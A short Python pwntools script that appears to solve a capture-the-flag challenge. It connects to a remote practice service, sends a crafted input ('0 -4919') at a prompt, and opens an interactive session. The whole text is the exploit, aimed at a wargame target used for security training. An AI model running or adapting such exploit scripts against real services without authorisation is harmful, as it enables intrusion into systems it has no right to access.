from pwn import *

p = remote("svc.pwnable.xyz", 30001)

payload = "0 -4919"
p.sendlineafter("1337 input: ", payload)
p.interactive()